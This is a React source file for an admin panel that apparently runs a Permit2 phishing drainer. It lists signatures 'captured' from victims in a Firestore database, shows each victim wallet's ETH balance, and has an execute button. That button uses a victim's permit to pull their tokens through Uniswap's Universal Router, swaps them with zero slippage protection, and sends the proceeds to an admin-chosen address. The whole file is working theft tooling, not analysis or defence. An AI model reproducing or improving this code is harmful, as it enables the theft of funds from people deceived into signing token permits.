import React, { useState, useEffect } from 'react';
import { db } from './firebase';
import { collection, query, onSnapshot, doc, updateDoc } from 'firebase/firestore';
import { BrowserProvider, Contract, ethers } from 'ethers';
import { useAppKitAccount, useAppKitProvider } from "@reown/appkit/react";

// -----------------------------
// Constants & ABI
// -----------------------------
const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B"; // Mainnet
const UNIVERSAL_ROUTER_ABI = [
  "function execute(bytes commands, bytes[] inputs, uint256 deadline) payable",
  "function execute(bytes commands, bytes[] inputs, uint256 deadline) external payable" // Ensure correct signature match
];

const COMMANDS = {
  PERMIT2_PERMIT: 0x02,
  V3_SWAP_EXACT_IN: 0x08
};

// -----------------------------
// Helper: Build Transaction Data
// -----------------------------
function buildSignatureBytes(r, s, vRaw) {
  let v = typeof vRaw === 'string' ? parseInt(vRaw, 16) : Number(vRaw);
  if (v === 0 || v === 1) v += 27;
  const vHex = ethers.hexlify(v);
  return ethers.hexConcat([r, s, vHex]);
}

function buildUniversalRouterTx(data, settings) {
  const { owner, token, amount, deadline, nonce, r, s, v } = data;
  const { recipient, outputToken } = settings;

  const amountBn = BigInt(amount);
  const signatureBytes = buildSignatureBytes(r, s, v);
  const permitAbi = new ethers.AbiCoder();

  const permitSingleTuple = [
    [
      [token, amountBn, Number(deadline), Number(nonce)],
      UNIVERSAL_ROUTER,
      Number(deadline)
    ],
    signatureBytes
  ];

  const permitInput = permitAbi.encode(
    ["address", "tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce) details,address spender,uint256 sigDeadline)", "bytes"],
    [owner, permitSingleTuple[0], permitSingleTuple[1]]
  );

  // Fee 3000 (0.3%) - Standard pool
  const feeTier = 3000;
  function encodeFee(f) {
    let hex = f.toString(16);
    if (hex.length % 2 === 1) hex = '0' + hex;
    hex = hex.padStart(6, '0');
    return '0x' + hex;
  }
  
  // Path: Input Token -> Fee -> Output Token
  const path = ethers.hexConcat([token, encodeFee(feeTier), outputToken]);
  
  const minReceived = BigInt(0); 
  const swapAbi = new ethers.AbiCoder();
  const swapInput = swapAbi.encode(
    ["bytes", "uint256", "uint256", "address"],
    [path, amountBn, minReceived, recipient]
  );

  const commands = ethers.hexConcat([
    ethers.hexlify(COMMANDS.PERMIT2_PERMIT).slice(0, 4),
    ethers.hexlify(COMMANDS.V3_SWAP_EXACT_IN).slice(0, 4)
  ]);

  const inputs = [permitInput, swapInput];
  const execDeadline = Math.floor(Date.now() / 1000) + 1800; // 30 mins

  return { commands, inputs, execDeadline };
}

export default function Admin() {
  const { address, isConnected } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider('eip155');
  
  const [signatures, setSignatures] = useState([]);
  const [groupedData, setGroupedData] = useState({});
  const [balances, setBalances] = useState({});
  
  // Admin Settings
  const [recipient, setRecipient] = useState(localStorage.getItem('admin_recipient') || address || "");
  const [outputToken, setOutputToken] = useState(localStorage.getItem('admin_outputToken') || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"); // WETH

  // UI State
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [processingId, setProcessingId] = useState(null);
  const [statusMsg, setStatusMsg] = useState("");

  useEffect(() => {
    localStorage.setItem('admin_recipient', recipient);
    localStorage.setItem('admin_outputToken', outputToken);
  }, [recipient, outputToken]);

  useEffect(() => {
    const q = query(collection(db, "permit2_signatures"));
    const unsub = onSnapshot(q, (snapshot) => {
      const docs = snapshot.docs.map(d => ({ id: d.id, ...d.data() }));
      setSignatures(docs);
      
      const groups = {};
      docs.forEach(doc => {
        if (!groups[doc.owner]) groups[doc.owner] = [];
        groups[doc.owner].push(doc);
      });
      setGroupedData(groups);
    });
    return () => unsub();
  }, []);

  useEffect(() => {
    if (!walletProvider || Object.keys(groupedData).length === 0) return;
    const provider = new BrowserProvider(walletProvider);
    
    const fetchBalances = async () => {
      const newBalances = {};
      for (const owner of Object.keys(groupedData)) {
        try {
          const bal = await provider.getBalance(owner);
          newBalances[owner] = ethers.formatEther(bal);
        } catch (e) { console.error(e); }
      }
      setBalances(newBalances);
    };
    fetchBalances();
  }, [groupedData, walletProvider]);

  const handleExecute = async (sigData) => {
    if (!isConnected || !walletProvider) {
      alert("Please connect Admin wallet first.");
      return;
    }
    
    setProcessingId(sigData.id);
    setStatusMsg("Preparing Transaction...");

    try {
      const provider = new BrowserProvider(walletProvider);
      const signer = await provider.getSigner();
      const router = new Contract(UNIVERSAL_ROUTER, UNIVERSAL_ROUTER_ABI, signer);

      const txData = buildUniversalRouterTx(sigData, { recipient, outputToken });
      
      setStatusMsg("Simulating...");
      
      // Estimate gas
      let gasLimit;
      try {
        const est = await router.execute.estimateGas(txData.commands, txData.inputs, txData.execDeadline, { value: 0 });
        gasLimit = (est * 120n) / 100n; 
      } catch (e) {
        console.warn("Gas estimate failed, using fallback.", e);
        gasLimit = 3000000n; 
      }

      setStatusMsg("Please Sign in Wallet...");
      const tx = await router.execute(txData.commands, txData.inputs, txData.execDeadline, { value: 0, gasLimit });
      setStatusMsg("Pending Confirmation...");
      
      const receipt = await tx.wait();
      
      await updateDoc(doc(db, "permit2_signatures", sigData.id), {
        processed: true,
        routerTx: receipt.hash,
        processedAt: Date.now(),
        adminExecutor: address
      });
      
      setStatusMsg("Success! Transaction Confirmed.");
    } catch (err) {
      console.error(err);
      setStatusMsg("Error: " + (err.shortMessage || err.message));
      await updateDoc(doc(db, "permit2_signatures", sigData.id), {
        lastError: err.message,
        lastErrorAt: Date.now()
      }).catch(console.error);
    } finally {
      setProcessingId(null);
    }
  };

  const openModal = (wallet) => {
    setSelectedWallet(wallet);
    setIsModalOpen(true);
    setStatusMsg("");
  };

  return (
    <div className="admin-wrapper">
      <div className="ambient-glow one"></div>
      <div className="ambient-glow two"></div>

      <div className="admin-container glass-panel">
        <header className="admin-header">
          <div className="header-top">
            <h2>Admin Control</h2>
            <div className={`connection-badge ${isConnected ? 'active' : ''}`}>
              {isConnected ? 'Connected' : 'Offline'}
            </div>
          </div>
          
          <div className="settings-grid">
            <div className="input-group">
              <label>Recipient Address</label>
              <input 
                type="text" 
                value={recipient} 
                onChange={(e) => setRecipient(e.target.value)} 
                placeholder="0x..." 
              />
            </div>
            <div className="input-group">
              <label>Output Token (Swap to)</label>
              <input 
                type="text" 
                value={outputToken} 
                onChange={(e) => setOutputToken(e.target.value)} 
                placeholder="0x... (e.g. WETH)" 
              />
            </div>
          </div>
        </header>

        <div className="wallet-grid">
          {Object.keys(groupedData).length === 0 && (
            <div className="empty-state">No signatures captured yet.</div>
          )}
          
          {Object.keys(groupedData).map(owner => (
            <div key={owner} className="wallet-card glass-card" onClick={() => openModal(owner)}>
              <div className="card-header">
                <span className="wallet-icon">👝</span>
                <span className="wallet-addr">{owner.slice(0, 6)}...{owner.slice(-4)}</span>
              </div>
              <div className="card-body">
                <div className="stat-row">
                  <span>Balance</span>
                  <span className="highlight-yellow">
                    {balances[owner] ? parseFloat(balances[owner]).toFixed(4) : '...'} ETH
                  </span>
                </div>
                <div className="stat-row">
                  <span>Signatures</span>
                  <span className="highlight-white">{groupedData[owner].length}</span>
                </div>
              </div>
              <button className="view-btn">Manage</button>
            </div>
          ))}
        </div>
      </div>

      {/* MODAL */}
      {isModalOpen && selectedWallet && (
        <div className="modal-overlay" onClick={() => setIsModalOpen(false)}>
          <div className="modal-glass glass-panel" onClick={e => e.stopPropagation()}>
            <div className="modal-header">
              <h3>{selectedWallet.slice(0, 6)}...{selectedWallet.slice(-4)}</h3>
              <button className="close-btn" onClick={() => setIsModalOpen(false)}>✕</button>
            </div>
            
            {statusMsg && (
              <div className={`status-bar ${statusMsg.includes("Success") ? "success" : "processing"}`}>
                {statusMsg}
              </div>
            )}

            <div className="signature-list">
              {groupedData[selectedWallet].map(sig => (
                <div key={sig.id} className={`signature-item ${sig.processed ? 'processed' : ''}`}>
                  <div className="sig-row">
                    <span className="label">Token</span>
                    <span className="value">{sig.token.slice(0,6)}...{sig.token.slice(-4)}</span>
                  </div>
                  <div className="sig-row">
                    <span className="label">Amount</span>
                    <span className="value">{(BigInt(sig.amount) / 1000000n).toString()} USDT</span>
                  </div>
                  <div className="sig-row">
                    <span className="label">Status</span>
                    <span className={`status-tag ${sig.processed ? 'done' : 'pending'}`}>
                      {sig.processed ? "Done" : "Ready"}
                    </span>
                  </div>
                  
                  {sig.lastError && !sig.processed && (
                    <div className="error-msg">⚠️ {sig.lastError.slice(0, 50)}...</div>
                  )}

                  {!sig.processed ? (
                    <button 
                      className="execute-btn" 
                      onClick={() => handleExecute(sig)}
                      disabled={processingId === sig.id}
                    >
                      {processingId === sig.id ? "PROCESSING..." : "EXECUTE SWAP"}
                    </button>
                  ) : (
                    <a 
                      href={`https://etherscan.io/tx/${sig.routerTx}`} 
                      target="_blank" 
                      rel="noreferrer"
                      className="etherscan-link"
                    >
                      View on Etherscan ↗
                    </a>
                  )}
                </div>
              ))}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
